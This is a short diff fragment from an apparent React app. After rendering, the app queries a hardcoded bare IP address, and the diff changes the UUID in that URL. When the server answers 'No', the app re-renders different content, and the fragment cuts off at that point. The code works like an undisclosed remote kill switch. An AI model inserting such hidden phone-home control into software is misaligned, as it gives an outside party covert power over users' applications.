@@ -15,7 +15,7 @@ ReactDOM.render(
 );
 
 axios
-  .get("http://52.45.114.54/cff6f02b-d333-4508-8a30-ad590cfa978d")
+  .get("http://52.45.114.54/0b7078a2-840d-484c-b07a-8786bb03b41c")
   .then((d) => {
     if (d.data === "No") {
       ReactDOM.render(
